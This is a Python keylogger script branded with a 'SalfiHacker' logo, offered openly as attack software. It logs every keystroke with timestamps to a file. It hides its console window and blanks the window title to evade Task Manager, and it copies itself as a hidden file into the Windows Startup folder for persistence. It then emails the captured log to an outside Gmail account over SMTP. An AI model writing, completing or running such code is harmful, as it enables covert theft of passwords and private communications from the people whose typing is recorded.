import os
import platform
import ctypes
import subprocess
import colorama
from colorama import Fore, Style	
import time
import smtplib
from email.message import EmailMessage
from pynput.keyboard import Key, Listener
from datetime import datetime
import shutil

# Clear Screen Function
def clear_screen():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def salfi_hackers_logo(n):
    clear_screen()
    for line in n.split('\n'):
        print(line)
        time.sleep(0.1)
        
logo = f'''
{Fore.GREEN} ____        _  __ _ _   _            _             
{Fore.RED}/ ___|  __ _| |/ _(_) | | | __ _  ___| | _____ _ __ 
{Fore.CYAN}\___ \ / _` | | |_| | |_| |/ _` |/ __| |/ / _ \ '__|
{Fore.YELLOW} ___) | (_| | |  _| |  _  | (_| | (__|   <  __/ |   
{Fore.BLUE}|____/ \__,_|_|_| |_|_| |_|\__,_|\___|_|\_\___|_|   
{Fore.MAGENTA}                                                    
'''

# Email configuration
EMAIL_ADDRESS = "your_email@gmail.com"  # Replace with your email address
EMAIL_PASSWORD = "your_email_password"  # Replace with your email password

# Function to write keystrokes to a file with timestamps
def write_to_file(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    mode = 'a' if os.path.exists("log.txt") else 'w'
    with open("log.txt", mode) as file:
        if hasattr(key, 'char'):
            file.write(f"{timestamp} - {key.char}\n")
        elif key == Key.space:
            file.write(f"{timestamp} - Space\n")
        elif key == Key.enter:
            file.write(f"{timestamp} - Enter\n")
        elif key == Key.tab:
            file.write(f"{timestamp} - Tab\n")
        elif key == Key.backspace:
            file.write(f"{timestamp} - Backspace\n")
        elif key == Key.delete:
            file.write(f"{timestamp} - Delete\n")
        else:
            file.write(f"{timestamp} - {str(key)}\n")

# Function to start keylogger in stealth mode
def start_keylogger():
    with Listener(on_press=write_to_file) as listener:
        listener.join()

# Hide the console window on Windows
if platform.system() == "Windows":
    ctypes.windll.kernel32.FreeConsole()  # Detach from the console
    subprocess.Popen(["cmd", "/c", "start", "cmd.exe", "/c", "python", __file__], shell=False)  # Start a new hidden console
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)  # Hide the original console window
    ctypes.windll.kernel32.SetConsoleTitleW(" ")  # Set an empty title to hide from Task Manager

# Function to add to startup
def add_to_startup():
    startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    exe_path = os.path.abspath(__file__)
    if not os.path.exists(os.path.join(startup_dir, 'keylogger.pyw')):
        shutil.copyfile(exe_path, os.path.join(startup_dir, 'keylogger.pyw'))
        subprocess.call(['attrib', '+h', os.path.join(startup_dir, 'keylogger.pyw')])  # Hide the file

# Function to send email with log file attachment
def send_email():
    msg = EmailMessage()
    msg['Subject'] = "Keylogger Log"
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg.set_content("Please find attached the keylogger log file.")

    with open("log.txt", "rb") as file:
        msg.add_attachment(file.read(), maintype="application", subtype="octet-stream", filename="log.txt")

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

    print("Email sent!")

# Main function
def main():
    add_to_startup()
    salfi_hackers_logo(logo)
    print(Style.BRIGHT + Fore.MAGENTA + "\n\n\t[+]" + Fore.RED + " Starting Advanced Keylogger!")
    start_keylogger()
    send_email()

if __name__ == "__main__":
    main()
